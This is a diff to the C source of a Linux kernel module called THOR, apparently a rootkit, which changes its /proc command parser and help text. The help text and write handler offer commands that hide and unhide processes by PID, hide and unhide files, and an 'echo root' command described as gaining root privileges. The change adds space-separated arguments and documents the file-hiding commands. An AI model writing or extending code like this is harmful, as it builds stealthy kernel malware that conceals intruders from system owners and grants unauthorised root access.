@@ -123,9 +123,12 @@ static int procfile_read(struct seq_file *m, void *v)
 {
     seq_printf(m,
         "usage:\n"\
-        "   echo hpPID > /proc/" THOR_PROCFILE " (hides process PID)\n"\
-        "   echo upPID > /proc/" THOR_PROCFILE " (unhides process PID)\n"\
+        "   echo hp PID > /proc/" THOR_PROCFILE " (hides process PID)\n"\
+        "   echo up PID > /proc/" THOR_PROCFILE " (unhides process PID)\n"\
         "   echo upa > /proc/" THOR_PROCFILE " (unhide all PIDs)\n"\
+        "   echo hf FILE > /proc/" THOR_PROCFILE " (hide file FILE)\n"\
+        "   echo uf FILE > /proc/" THOR_PROCFILE " (unhide file FILE)\n"\
+        "   echo ufa > /proc/" THOR_PROCFILE " (unhide all files)\n"\
         "   echo root > /proc/" THOR_PROCFILE " (gain root privileges)\n");
     return 0;
 }
@@ -138,29 +141,29 @@ static int procfile_open(struct inode *inode, struct file *file)
 static ssize_t procfile_write(struct file *file, const char __user *buffer,
         size_t count, loff_t *ppos)
 {
-    if(0 == strncmp(buffer, "hp", MIN(2, count)))
+    if(0 == strncmp(buffer, "hp ", MIN(3, count)))
     {
-        add_to_pid_list(buffer+2, count-2);
+        add_to_pid_list(buffer+3, count-3);
     }
     else if(0 == strncmp(buffer, "upa", MIN(3, count)))
     {
         clear_pid_list();
     }
-    else if(0 == strncmp(buffer, "up", MIN(2, count)))
+    else if(0 == strncmp(buffer, "up ", MIN(3, count)))
     {
-        remove_from_pid_list(buffer+2, count-2);
+        remove_from_pid_list(buffer+3, count-3);
     }
-    else if(0 == strncmp(buffer, "hf", MIN(2, count)))
+    else if(0 == strncmp(buffer, "hf ", MIN(3, count)))
     {
-        add_to_file_list(buffer+2, count-2);
+        add_to_file_list(buffer+3, count-3);
     }
     else if(0 == strncmp(buffer, "ufa", MIN(3, count)))
     {
         clear_file_list();
     }
-    else if(0 == strncmp(buffer, "uf", MIN(2, count)))
+    else if(0 == strncmp(buffer, "uf ", MIN(3, count)))
     {
-        remove_from_file_list(buffer+2, count-2);
+        remove_from_file_list(buffer+3, count-3);
     }
     else if(0 == strncmp(buffer, "root", MIN(4, count)))
     {
